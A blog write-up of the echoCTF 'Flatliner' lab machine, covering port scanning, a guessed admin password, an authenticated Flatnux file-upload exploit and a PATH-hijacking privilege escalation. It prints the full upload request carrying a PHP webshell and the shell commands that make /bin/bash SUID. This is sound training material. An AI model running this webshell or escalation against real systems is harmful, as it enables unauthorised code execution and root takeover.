---
description: >-
  Flatliner echoCTF Machine
title: Flatliner (Intermediate)                # Add title here
date: 2025-02-20 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Intermediate]                     # Change Templates to Writeup
tags: []     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Flatliner.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.160.224
```

### Content

- Weak Password, same as the CMS name
- Flatnux Remote Code Execution (Authenticated)
- Path Hijacking

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.224
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.224 ()   Status: Up
Host: 10.0.160.224 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
Services and Versions running:
```bash
nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.224
Nmap scan report for 10.0.160.224
Host is up, received user-set (0.19s latency).
Scanned at 2025-02-20 23:57:11 EST for 59s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   256 fb:d7:08:85:ed:62:2b:70:d9:c4:99:7d:96:9f:37:6a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwl0Nhx2u+zSxEjLL9lAMeUZFACICmBIcXDh6f/PUosofpec+9trK0xhMfISPTrt90KvFUHRdudRKs1+A5VeS8=
|   256 39:57:e6:b2:a0:b2:a4:6b:d6:3d:b3:89:2e:29:37:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIISwV9OuOMNiLXFeYk671tCkJjiGiQqFFUNJNq14Ulr4
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.61
| http-methods: 
|_  Supported Methods: GET
|_http-title: Flat time
```

### Exploitation

There is only HTTP port open which has a web page only:

![](/assets/img/Pasted-image-20250220225718.png)

Looking for exploits on this CMS, we identified the following [flatnux - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/51295)

Now, the important thing here is that the exploit requires authentication, this authentication was very tricky, the following credentials were the success ones `admin:flatnux` I've used `cewl` to create a list from the website. Then all you need to do is follow the steps on the exploit which is basically upload a file from the webpage, this is the HTTP request:
```bash
POST /filemanager.php?opmod=upload HTTP/1.1
Host: 10.0.160.224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------93361341221244197981349489882
Content-Length: 627
Origin: http://10.0.160.224
Connection: keep-alive
Referer: http://10.0.160.224//filemanager.php
Cookie: fnuser=admin; secid=1fa1063f452e44d88c8903d01c4ebc44
Upgrade-Insecure-Requests: 1

-----------------------------93361341221244197981349489882
Content-Disposition: form-data; name="filename"; filename="exploit.php"
Content-Type: application/x-php

<?php system($_REQUEST["cmd"]); ?>

-----------------------------93361341221244197981349489882
Content-Disposition: form-data; name="MAX_FILE_SIZE"

90000000
-----------------------------93361341221244197981349489882
Content-Disposition: form-data; name="dir"

/var/www/html
-----------------------------93361341221244197981349489882
Content-Disposition: form-data; name="send"

Send
-----------------------------93361341221244197981349489882--
```

After that you'll get a webshell on this HTTP request:
```bash
http://10.0.160.224/exploit.php?cmd=whoami
```

### Privilege Escalation
The privilege escalation was very straightforward, a binary that we can execute without password:
```bash
www-data@flatliner:/var/www/html$ sudo -l
User www-data may run the following commands on flatliner:
    (ALL : ALL) NOPASSWD: /usr/local/bin/flatline
```
And the content of the flatline binary is this:
```bash
www-data@flatliner:/var/www/html$ cat /usr/local/bin/flatline
#!/bin/bash
cat flatliner
```
Basically we have a command without full path which is most likely to be vulnerable to PATH Hijacking, so we can execute anything as root if we call it `cat`:
```bash
www-data@flatliner:/tmp$ echo '#!/bin/bash' > cat
www-data@flatliner:/tmp$ echo 'chmod +s /bin/bash' >> cat
www-data@flatliner:/tmp$ cat cat
#!/bin/bash
chmod +s /bin/bash
www-data@flatliner:/tmp$ chmod +x cat 
```
Then we need to modify our `PATH` environment variable:
```bash
www-data@flatliner:/tmp$ export PATH=/tmp:$PATH
www-data@flatliner:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
And finally, we execute the exploit:
```bash
www-data@flatliner:/tmp$ sudo /usr/local/bin/flatline
www-data@flatliner:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
And we are INSIDE!!!


### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

- GOD DAMN IT DATABUS this was hard to find, credentials were `admin:flatnux`

### Notes

-  Sometimes default credentials are not public, but thinking as an attacker, if we think about it, people uses very easy passwords sometimes, in this case the name of the CMS was the password for the admin account, lesson learned, well played...

### References
- [flatnux - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/51295)


